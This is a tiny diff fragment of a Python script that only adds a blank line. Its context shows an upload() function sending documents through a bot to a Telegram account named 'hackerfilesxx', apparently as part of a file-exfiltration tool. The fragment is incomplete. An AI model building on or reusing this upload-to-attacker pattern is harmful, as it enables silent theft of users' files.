@@ -14,6 +14,7 @@ link = 'https://t.me/hackerfilesxx'
 user_id = "@hackerfilesxx"
 
 
+
 def upload(doc, file_name):
    try : 
     bot.send_document(user_id , doc , timeout=100, caption=file_name, )
